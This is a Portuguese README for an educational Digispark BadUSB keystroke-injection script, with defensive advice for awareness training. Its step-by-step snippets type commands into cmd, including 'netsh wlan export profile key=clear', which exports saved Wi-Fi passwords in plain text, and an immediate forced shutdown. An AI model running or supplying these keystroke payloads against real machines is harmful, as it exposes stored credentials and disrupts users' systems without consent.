# 🐚 Digispark BadUSB Awareness

Este repositório contém um **script educativo para Digispark**, criado para fins de conscientização e demonstração de riscos de BadUSB.

---

## ⚠️ AVISO IMPORTANTE

Este código **simula ataques BadUSB** e pode ser potencialmente perigoso se usado em sistemas sem autorização.

> ❗ **Nunca utilize este script em computadores sem permissão explícita.**
> Ele deve ser usado apenas para fins educativos e de conscientização.

---

## 🔍 O que o código faz — Explicado passo a passo

O script demonstra como um Digispark pode automatizar comandos no Windows de forma silenciosa, simulando um teclado:

### 1. Inicialização
```c
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(1500);
```
- Inicializa o teclado virtual do Digispark e aguarda reconhecimento pelo sistema.

### 2. Abrir o Bloco de Notas e exibir mensagem de alerta
```c
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.print("notepad");
```
- Abre o Bloco de Notas e escreve uma **mensagem educativa**, alertando sobre riscos de BadUSB.

### 3. Abrir navegador
```c
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.print("www.google.com");
```
- Abre o navegador padrão e acessa o Google.

### 4. Abrir CMD e exportar perfis Wi-Fi
```c
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.print("cmd");
DigiKeyboard.print("netsh wlan export profile key=clear");
```
- Mostra como um atacante poderia acessar **senhas de redes Wi-Fi** (para fins educativos).

### 5. Desligamento do computador
```c
DigiKeyboard.print("shutdown -s -t 0");
```
- Executa **desligamento imediato**, demonstrando controle remoto total via USB.

---

## ✅ Exemplos de uso educativo

- Treinamentos internos de segurança da informação.
- Demonstração de riscos de BadUSB para equipes.
- Estudos de conscientização e prevenção de ataques.

---

## 🛡️ Proteção recomendada

- Nunca conecte dispositivos USB desconhecidos.
- Monitore e restrinja o uso de dispositivos programáveis na empresa.
- Eduque colaboradores sobre engenharia social e ataques USB.

---

## 🧑‍💻 Autor

- [h4ckthreat](https://github.com/h4ckthreat)
  
> Projeto educativo e de conscientização.

---

## 📄 Licença

Distribuído sob a [GNU GPL v3](https://www.gnu.org/licenses/old-licenses/gpl-3.0.html).

